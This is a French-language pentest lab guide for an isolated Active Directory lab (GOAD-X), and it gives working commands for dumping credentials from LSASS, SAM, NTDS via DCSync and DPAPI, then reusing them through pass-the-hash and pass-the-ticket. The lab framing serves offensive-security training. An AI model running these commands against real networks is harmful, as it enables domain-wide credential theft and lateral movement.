# Build — Extraire et réutiliser des credentials (lab isolé GOAD-X)

## Pré-requis
- Un accès **admin local** sur une machine (LSASS/SAM) ou des droits de **réplication** (DCSync).
  Poste attaquant. Lab isolé.

## Étape 1 — LSASS (hashes/tickets)
```bash
# À distance via NetExec (lab)
nxc smb 10.10.0.22 -u adm -p 'pass' --local-auth -M lsassy
# Ou Mimikatz sur la cible : sekurlsa::logonpasswords / sekurlsa::tickets
```

## Étape 2 — SAM / LSA secrets (local)
```bash
impacket-secretsdump 'CORP/adm:pass@10.10.0.22'          # SAM + LSA + cached
# Local sur la machine : reg save HKLM\SAM sam.save (puis secretsdump -sam ...)
```

## Étape 3 — NTDS via DCSync (le plus propre)
```bash
# Nécessite les droits de réplication (ex. compte DC via module 54, ou DA)
impacket-secretsdump 'CORP/DC01$@10.10.0.10' -k -no-pass -just-dc           # tout le domaine
impacket-secretsdump 'CORP/adm:pass@10.10.0.10' -just-dc-user krbtgt        # juste krbtgt
```

## Étape 4 — DPAPI (secrets utilisateur)
```bash
# Déchiffrer des secrets DPAPI (master key + blobs) — SharpDPAPI/mimikatz/impacket
impacket-dpapi masterkey -file masterkey -sid <SID> -password <pw>   # exemple de flux
```

## Étape 5 — Réutiliser (PtH / PtT / OverPtH)
```bash
# Pass-the-Hash
nxc smb 10.10.0.23 -u Administrator -H <NThash>
# OverPass-the-Hash (hash -> TGT)
impacket-getTGT 'CORP/adm' -hashes :<NThash> -dc-ip 10.10.0.10 && export KRB5CCNAME=adm.ccache
# Pass-the-Ticket : injecter un .ccache/.kirbi volé
```

## Vérification
- Hashes/tickets obtenus et réutilisés pour accéder à une autre machine ; krbtgt récupéré (→ module 57).

## Pièges courants
- **Credential Guard** actif → LSASS ne livre pas les secrets (c'est la défense).
- DCSync sans droits de réplication → refus.
- WDigest off → pas de mot de passe en clair.
